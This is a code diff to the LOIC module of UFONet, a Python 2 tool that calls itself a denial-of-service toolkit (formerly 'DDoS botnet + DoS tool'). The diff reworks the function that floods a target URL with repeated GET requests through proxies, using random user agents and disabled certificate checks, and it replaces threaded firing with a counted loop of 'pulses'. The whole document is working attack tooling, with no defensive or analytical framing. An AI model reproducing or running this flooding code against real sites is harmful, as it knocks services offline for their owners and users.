@@ -1,27 +1,34 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - (DDoS botnet + DoS tool) via Web Abuse - 2017/2018 - by psy (epsylon@riseup.net)
+UFONet - Denial of Service Toolkit - 2017/2018 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import requests, random, threading, time
+import requests, random
+from requests.packages.urllib3.exceptions import InsecureRequestWarning # black magic
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # UFONet DoS Web LOIC (Low Orbit Ion Cannon)
-def ionize(self, target, proxy):
+def ionize(self, target, rounds, proxy):
+    n=0
     try:
         proxyD = { 
               "http"  : proxy, 
             }
-        self.user_agent = random.choice(self.agents).strip()
-        headers = {'User-Agent': str(self.user_agent)}
-        requests.get(target, headers=headers, proxies=proxyD, verify=False)
-        print "[Info] Firing 'pulse' from: LOIC -> Status: HIT!"
+        for i in range(0, int(rounds)):
+            n=n+1
+            self.user_agent = random.choice(self.agents).strip()
+            headers = {'User-Agent': str(self.user_agent)}
+            try:
+                r = requests.get(target, headers=headers, proxies=proxyD, verify=False)
+                print "[Info] LOIC: Firing 'pulse' ["+str(n)+"] -> Status: HIT!"
+            except:
+                print "[Error] LOIC: Failed to engage with 'pulse' ["+str(n)+"]"
     except:
-        print("[Error] LOIC is failing to engage. Is still target online?...")
-        pass
+        print("[Error] LOIC: Failing to engage. Is still target online?...")
 
 class LOIC(object):
     def __init__(self):
@@ -33,10 +40,6 @@ class LOIC(object):
         for agent in agents:
             self.agents.append(agent)
 
-    def attacking(self, target, requests, proxy):
-        print "\n[Info] Low Orbit Ion Cannon (LOIC) is ready to fire: [" , requests, "pulses ]\n"
-        for i in range(0, int(requests)): 
-            t = threading.Thread(target=ionize, args=(self, target, proxy)) # attack with LOIC using threading
-            t.daemon = True
-            t.start()
-            time.sleep(1)
+    def attacking(self, target, rounds, proxy):
+        print "\n[Info] Low Orbit Ion Cannon (LOIC) is ready to fire: [" , rounds, "pulses ]"
+        ionize(self, target, rounds, proxy) # attack with LOIC using threading
